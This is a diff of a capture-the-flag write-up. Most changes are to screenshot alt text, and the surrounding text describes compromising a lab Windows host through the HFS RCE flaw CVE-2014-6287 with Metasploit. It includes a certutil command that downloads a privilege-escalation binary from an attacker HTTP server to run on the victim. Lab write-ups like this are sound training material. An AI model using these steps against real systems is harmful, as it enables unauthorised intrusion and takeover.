@@ -37,7 +37,7 @@ We start by verifying host availability with ICMP:
 ping -c 1 10.10.10.8
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -57,7 +57,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -65,7 +65,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -80,13 +80,7 @@ nmap -p80 -sC -sV 10.10.10.8 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
-
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**  
 
@@ -99,7 +93,7 @@ cat targeted -l java
 
 Browsing to the site shows the **HFS web interface**:
 
-![](screenshots/hfs_web.png)
+![hfs_web](screenshots/hfs_web.png)
 
 HFS is a lightweight HTTP file server often used to share files. Since it allows template macros, it may be vulnerable to **RCE**.  
 
@@ -109,7 +103,7 @@ Check for exploits with SearchSploit:
 searchsploit HFS
 ```
 
-![](screenshots/searchsploit_hfs.png)
+![searchsploit_hfs](screenshots/searchsploit_hfs.png)
 
 One of the results (39161.py) corresponds to **CVE-2014-6287 (RCE)**.
 
@@ -119,7 +113,7 @@ Inspect the exploit code:
 searchsploit -x windows/remote/39161.py
 ```
 
-![](screenshots/hfs_exploit.png)
+![hfs_exploit](screenshots/hfs_exploit.png)
 
 **Vulnerability:**  
 - HFS interprets template macros like `{.exec|...}`, leading to RCE.  
@@ -139,7 +133,7 @@ msfconsole
 search hfs
 ```
 
-![](screenshots/metasploit.png)
+![metasploit](screenshots/metasploit.png)
 
 The fourth exploit is the correct one, so let's configure it:
 
@@ -153,7 +147,7 @@ run
 
 A Meterpreter session is established.
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -162,7 +156,7 @@ A Meterpreter session is established.
 
 Attempting access to Administrator’s directory:
 
-![](screenshots/cd_admin_denied.png)
+![cd_admin_denied](screenshots/cd_admin_denied.png)
 
 Access denied. Next step: privilege escalation.
 
@@ -172,7 +166,7 @@ Check user privileges:
 whoami /all
 ```
 
-![](screenshots/kostas_info.png)
+![kostas_info](screenshots/kostas_info.png)
 
 Minimal privileges. Let’s gather system info:
 
@@ -180,7 +174,7 @@ Minimal privileges. Let’s gather system info:
 systeminfo
 ```
 
-![](screenshots/systeminfo.png)
+![systeminfo](screenshots/systeminfo.png)
 
 ---
 ## 5. Privilege Escalation
@@ -197,7 +191,7 @@ Use **Windows Exploit Suggester (WES-NG):**
 python3 wes.py systeminfo.txt
 ```
 
-![](screenshots/systeminfo_exploits.png)
+![systeminfo_exploits](screenshots/systeminfo_exploits.png)
 
 The screenshot below shows just a portion of the exploits identified for this Windows version.
 
@@ -211,11 +205,11 @@ Transfer it to the victim with `certutil`:
 certutil.exe -f -urlcache -split http://10.10.14.10:8000/privesc.exe privesc.exe
 ```
 
-![](screenshots/exploit_uploaded.png)
+![exploit_uploaded](screenshots/exploit_uploaded.png)
 
 Execute the binary:
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 **Root flag obtained**
 
